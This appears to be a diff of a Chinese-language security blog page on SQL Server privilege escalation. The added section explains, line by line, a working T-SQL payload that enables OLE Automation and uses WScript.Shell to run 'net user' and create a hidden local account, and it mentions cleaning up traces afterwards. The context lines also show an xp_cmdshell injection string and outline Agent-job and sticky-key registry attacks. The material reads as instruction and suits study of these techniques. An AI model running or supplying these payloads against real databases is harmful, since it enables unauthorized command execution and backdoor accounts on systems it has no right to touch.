@@ -43,7 +43,7 @@
 <meta property="og:description" content="SQL Server提权SQL Server提权主要是依据一个特殊的存储过程“xp_cmdshell”，通过这个存储过程可以调用系统命令。 前提条件 在sysadmin权限下才能使用“xp_cmdshell”  提权分类（1）注入点提权 手工测试： 1?id &#x3D; 1; exec master.abo.cmdshell &#39;net user 1 1 &#x2F;add&#39; --   **exec**： SQL 关">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2025-11-10T13:29:23.749Z">
-<meta property="article:modified_time" content="2025-11-10T14:05:06.740Z">
+<meta property="article:modified_time" content="2025-11-10T14:17:31.723Z">
 <meta property="article:author" content="mX1@0">
 <meta name="twitter:card" content="summary">
   
@@ -375,7 +375,7 @@
 <li>**<code>RECONFIGURE</code>**：这个命令指示 SQL Server 立即更新当前运行的配置值，使其与 <code>sp_configure</code> 中设置的新值同步。执行完这一句，“显示高级选项”的开关才真正生效。</li>
 </ul>
 <h2 id="其他可用于提权的存储过程"><a href="#其他可用于提权的存储过程" class="headerlink" title="其他可用于提权的存储过程"></a>其他可用于提权的存储过程</h2><p>使用 <code>sqlserveragent</code>、<code>sp_oacreate</code> 和 <code>xp_regwrite</code> 来提权</p>
-<h3 id="1-利用-SQL-Server-Agent-sqlserveragent"><a href="#1-利用-SQL-Server-Agent-sqlserveragent" class="headerlink" title="1. 利用 SQL Server Agent (sqlserveragent)"></a>1. 利用 SQL Server Agent (<code>sqlserveragent</code>)</h3><p><strong>原理：</strong><br>SQL Server Agent 是 SQL Server 的一个组件，用于**<u>调度和执行计划任务</u><strong>（如数据库备份、数据导入等）。这些作业可以包含运行 <strong>Windows 命令</strong>的步骤。关键点在于，</strong>作业是由 SQL Server Agent 服务账户运行的**，而不是直接由当前登录的数据库用户上下文运行。</p>
+<h3 id="1-利用-SQL-Server-Agent-sqlserveragent"><a href="#1-利用-SQL-Server-Agent-sqlserveragent" class="headerlink" title="1. 利用 SQL Server Agent (sqlserveragent)"></a>1. 利用 SQL Server Agent (<code>sqlserveragent</code>)</h3><p><strong>原理：</strong><br>SQL Server Agent 是 SQL Server 的一个组件，用于**<u>调度和执行作业</u><strong>（如数据库备份、数据导入等）。这些作业可以包含运行 <strong>Windows 命令</strong>的步骤。关键点在于，</strong>作业是由 SQL Server Agent 服务账户运行的**，而不是直接由当前登录的数据库用户上下文运行。</p>
 <p><strong>提权步骤：</strong></p>
 <ol>
 <li><strong>检查权限</strong>：首先确认当前用户是否有权限创建和管理 SQL Server Agent 作业。通常需要是 <code>sysadmin</code> 固定服务器角色的成员，或者被显式授予了相关权限（如 <code>SQLAgentUserRole</code>）。</li>
@@ -444,21 +444,89 @@
 <li>这是让整个攻击<strong>立即生效</strong>的关键命令。执行后，SQL Server Agent 会立即开始处理 <code>SystemPrivEscJob</code> 作业，运行其中定义的 <code>CMDEXEC</code> 步骤。</li>
 </ul>
 <hr>
-<h3 id="2-利用-sp-OACreate-和-sp-OAMethod"><a href="#2-利用-sp-OACreate-和-sp-OAMethod" class="headerlink" title="2. 利用 sp_OACreate 和 sp_OAMethod"></a>2. 利用 <code>sp_OACreate</code> 和 <code>sp_OAMethod</code></h3><p><strong>原理：</strong><br>SQL Server 提供了一组 <strong>OLE Automation 存储过程</strong>（对象链接与嵌入自动化），允许 T-SQL 代码与 Windows 的 COM（组件对象模型）对象进行交互。这意味着可以在数据库内部实例化并调用像 <strong>Windows Script Host</strong> 或 <strong>FileSystemObject</strong> 这样的组件。</p>
-<p><strong>提权步骤：</strong></p>
+<h3 id="2-利用-sp-OACreate-和-sp-OAMethod"><a href="#2-利用-sp-OACreate-和-sp-OAMethod" class="headerlink" title="2. 利用 sp_OACreate 和 sp_OAMethod"></a>2. 利用 <code>sp_OACreate</code> 和 <code>sp_OAMethod</code></h3><blockquote>
+<p><strong>技术原理深度解析</strong></p>
 <ol>
-<li><p><strong>启用 OLE Automation</strong>：默认情况下此功能是关闭的，需要先启用。</p>
- <figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">'Ole Automation Procedures'</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></tbody></table></figure>
+<li><strong>OLE Automation 是什么？</strong><ul>
+<li>OLE（对象链接和嵌入）Automation 是一种<u>允许应用程序暴露其功能给其他应用程序的技术</u>。</li>
+<li>SQL Server 通过一系列 <code>sp_OA*</code> 存储过程支持 OLE Automation，使得 T-SQL 能够与 COM 组件交互。</li>
+</ul>
 </li>
-<li><p><strong>创建 COM 对象</strong>：使用 <code>sp_OACreate</code> 创建一个可以执行系统命令或文件的 COM 对象，最经典的是 **<code>WScript.Shell</code>**。</p>
+<li><strong>为什么 <code>WScript.Shell</code> 被选中？</strong><ul>
+<li><code>WScript.Shell</code> 是 Windows 系统自带的 COM 组件，通常在所有 Windows 机器上都可用。</li>
+<li>它提供了 <code>Run</code> 方法，可以直接执行任意可执行文件，包括 <code>cmd.exe</code>。</li>
+<li>它还可以用于操作注册表、访问系统文件夹等，功能强大。</li>
+</ul>
 </li>
-<li><p><strong>调用方法</strong>：使用 <code>sp_OAMethod</code> 调用该对象的 <code>Run</code> 方法，来执行系统命令。</p>
+<li><strong>执行上下文</strong><ul>
+<li>命令是以 <strong>SQL Server 服务账户</strong>的权限运行的，而不是当前数据库用户的权限。</li>
+<li>如果 SQL Server 服务以高权限账户（如 <code>LOCAL SYSTEM</code>）运行，那么创建的用户就是系统级用户。</li>
+</ul>
 </li>
 </ol>
+</blockquote>
+<p><strong>原理：</strong><br>SQL Server 提供了一组 <strong>OLE Automation 存储过程</strong>（对象链接与嵌入自动化），允许 T-SQL 代码与 Windows 的 COM（组件对象模型）对象进行交互。这意味着可以在数据库内部实例化并调用像 <strong>Windows Script Host</strong> 或 <strong>FileSystemObject</strong> 这样的组件。</p>
+<p>核心思路是：<strong>通过启用 OLE Automation 功能，在 SQL Server 内部创建 Windows 脚本宿主对象，利用该对象的 <code>Run</code> 方法来执行操作系统命令。</strong></p>
 <p><strong>利用场景：</strong><br>这提供了另一种无需 <code>xp_cmdshell</code> 即可执行操作系统命令的途径。如果 <code>xp_cmdshell</code> 被严格禁用，但 OLE Automation 过程被开启（或可以被开启），攻击者就会转向这种方法。</p>
 <p><strong>简单利用示例：</strong></p>
 <figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 启用 OLE Automation Procedures</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">'show advanced options'</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">'Ole Automation Procedures'</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 声明变量</span></span><br><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@shell</span> <span class="type">INT</span>;</span><br><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@result</span> <span class="type">INT</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建 'WScript.Shell' 对象</span></span><br><span class="line"><span class="keyword">EXEC</span> <span class="variable">@result</span> <span class="operator">=</span> sp_OACreate <span class="string">'WScript.Shell'</span>, <span class="variable">@shell</span> <span class="keyword">OUT</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 调用 Run 方法执行命令（添加用户）</span></span><br><span class="line"><span class="keyword">EXEC</span> <span class="variable">@result</span> <span class="operator">=</span> sp_OAMethod <span class="variable">@shell</span>, <span class="string">'Run'</span>, <span class="keyword">NULL</span>, <span class="string">'cmd.exe /c net user oahacker P@ssw0rd123! /add'</span>, <span class="number">0</span>, <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 销毁对象，清理痕迹</span></span><br><span class="line"><span class="keyword">EXEC</span> <span class="variable">@result</span> <span class="operator">=</span> sp_OADestroy <span class="variable">@shell</span>;</span><br><span class="line">GO</span><br></pre></td></tr></tbody></table></figure>
 
+<p><strong>第一部分：启用 OLE Automation 功能</strong></p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">'show advanced options'</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">'Ole Automation Procedures'</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">GO</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><strong><code>EXEC sp_configure 'show advanced options', 1</code></strong><br>  首先启用显示高级配置选项。因为 <code>Ole Automation Procedures</code> 是一个高级选项，默认情况下在配置列表中是不可见的。</li>
+<li><strong><code>RECONFIGURE</code></strong><br>  让”显示高级选项”的设置立即生效。</li>
+<li><strong><code>EXEC sp_configure 'Ole Automation Procedures', 1</code></strong><br>  这是关键设置：将 OLE Automation 过程的值设置为 <code>1</code>，即<strong>启用</strong>状态。默认情况下这个功能是<strong>禁用</strong>的（值为 <code>0</code>），因为它存在安全风险。</li>
+<li><strong>第二个 <code>RECONFIGURE</code></strong><br>  让 OLE Automation 的启用设置生效。</li>
+</ul>
+<p><strong>注意</strong>：执行这些配置更改通常需要 <code>sysadmin</code> 权限。</p>
+<p><strong>第二部分：声明变量</strong></p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@shell</span> <span class="type">INT</span>;</span><br><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@result</span> <span class="type">INT</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><strong><code>@shell INT</code><strong>：这个变量用于存储 COM 对象的</strong>句柄</strong>。当成功创建 COM 对象后，SQL Server 会返回一个整数标识符，后续通过这个句柄来操作该对象。</li>
+<li>**<code>@result INT</code>**：用于接收存储过程执行的返回代码（0 通常表示成功，非 0 表示失败）。</li>
+</ul>
+<p><strong>第三部分：创建 COM 对象（核心）</strong></p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> <span class="variable">@result</span> <span class="operator">=</span> sp_OACreate <span class="string">'WScript.Shell'</span>, <span class="variable">@shell</span> <span class="keyword">OUT</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><strong><code>sp_OACreate</code><strong>：这是 OLE Automation 的核心存储过程，用于</strong>创建 OLE 对象实例</strong>。</li>
+<li>**<code>'WScript.Shell'</code>**：这是要创建的 COM 对象的 ProgID（程序标识符）。<br>  <u><code>WScript.Shell</code> 是 Windows 脚本宿主提供的一个对象，它提供了访问 Windows shell 的方法，可以用于执行程序、操作注册表、处理快捷方式等。</u></li>
+<li>**<code>@shell OUT</code>**：<code>OUT</code> 关键字表示这是一个输出参数。成功创建对象后，对象的句柄会存储在这个变量中。</li>
+<li>**<code>@result</code>**：接收 <code>sp_OACreate</code> 的返回代码。</li>
+</ul>
+<p><strong>执行效果</strong>：这行代码在 SQL Server 进程内创建了一个 <code>WScript.Shell</code> COM 对象的实例。</p>
+<p><strong>第四部分：调用方法执行命令（攻击核心）</strong></p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> <span class="variable">@result</span> <span class="operator">=</span> sp_OAMethod <span class="variable">@shell</span>, <span class="string">'Run'</span>, <span class="keyword">NULL</span>, <span class="string">'cmd.exe /c net user oahacker P@ssw0rd123! /add'</span>, <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><strong><code>sp_OAMethod</code><strong>：用于</strong>调用 COM 对象的方法</strong>。</li>
+<li>**<code>@shell</code>**：指定要操作哪个 COM 对象（使用前面获取的句柄）。</li>
+<li>**<code>'Run'</code>**：指定要调用的方法名称。<code>WScript.Shell</code> 对象的 <code>Run</code> 方法用于执行一个应用程序。</li>
+<li>**<code>NULL</code>**：这里通常用于接收方法的返回值，<code>NULL</code> 表示我们不关心返回值。</li>
+<li><strong>命令参数详解</strong>：<ul>
+<li>**<code>'cmd.exe /c net user oahacker P@ssw0rd123! /add'</code>**：这是传递给 <code>Run</code> 方法的参数。<ul>
+<li><code>cmd.exe</code>：启动 Windows 命令处理器。</li>
+<li><code>/c</code>：表示执行完后面的命令后终止 cmd 进程。</li>
+<li><code>net user oahacker P@ssw0rd123! /add</code>：创建新用户 <code>oahacker</code> 并设置密码。</li>
+</ul>
+</li>
+<li>**<code>0</code>**：表示窗口状态（<code>intWindowStyle</code>），<code>0</code> 表示隐藏窗口，命令在后台执行。</li>
+<li>**<code>1</code>**：表示是否等待程序执行完毕（<code>bWaitOnReturn</code>），<code>1</code> 表示等待，<code>0</code> 表示立即返回。</li>
+</ul>
+</li>
+</ul>
+<p><strong>执行效果</strong>：这行代码实际上执行了系统命令 <code>net user oahacker P@ssw0rd123! /add</code>，在操作系统中创建了一个新用户。</p>
+<p><strong>第五部分：清理资源</strong></p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> <span class="variable">@result</span> <span class="operator">=</span> sp_OADestroy <span class="variable">@shell</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><strong><code>sp_OADestroy</code><strong>：用于</strong>销毁 COM 对象实例</strong>，释放相关资源。</li>
+<li>**<code>@shell</code>**：指定要销毁的对象的句柄。</li>
+</ul>
+<p><strong>目的</strong>：清理痕迹，释放内存资源。这是良好的编程实践，但在攻击中也可能用于减少被发现的风险。</p>
 <hr>
 <h3 id="3-利用-xp-regwrite"><a href="#3-利用-xp-regwrite" class="headerlink" title="3. 利用 xp_regwrite"></a>3. 利用 <code>xp_regwrite</code></h3><p><strong>原理：</strong><br><code>xp_regwrite</code> 是另一个扩展存储过程，它允许 SQL Server <strong>直接读写 Windows 注册表</strong>。注册表是 Windows 操作系统的核心配置数据库，控制着系统的方方面面。</p>
 <p><strong>提权步骤：</strong><br>通过修改注册表，可以实现多种提权目的，最常见的一种是<strong>劫持“粘滞键”辅助功能</strong>：</p>
@@ -537,7 +605,7 @@
       
         
         
-          <img data-src="/covers/20.jpg" data-sizes="auto" alt="Struts2 OGNL 代码执行漏洞" class="lazyload">
+          <img data-src="/covers/16.jpg" data-sizes="auto" alt="Struts2 OGNL 代码执行漏洞" class="lazyload">
         
       
       <a href="/2025/11/07/struts2-ognl-dai-ma-zhi-xing-lou-dong/"></a>
@@ -590,10 +658,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        309.7k
+        310.7k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        19:19
+        19:22
       </div>
     
     
@@ -794,7 +862,7 @@
           description: "",
           stripContent: "SQL Server提权SQL Server提权主要是依据一个特殊的存储过程“xp_cmdshell”，通过这个存储过程可以调用系统命令。 前提条件 在sysadmin权限下才能使用“xp_cmdshell”  提权分类（1）注入点提权 手工测试： 1?id = 1; exec master.abo.cmdshell &#39;net user 1 1 /add&#39; --   **exec**： SQL 关键字，是 EXECUTE 的缩写，用于执行一个存储过程。 **master.dbo.xp_cmdsh",
           date: "Mon Nov 10 2025 21:29:23 GMT+0800",
-          updated: "Mon Nov 10 2025 22:05:06 GMT+0800",
+          updated: "Mon Nov 10 2025 22:17:31 GMT+0800",
           cover: "/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg",
         };
       </script>
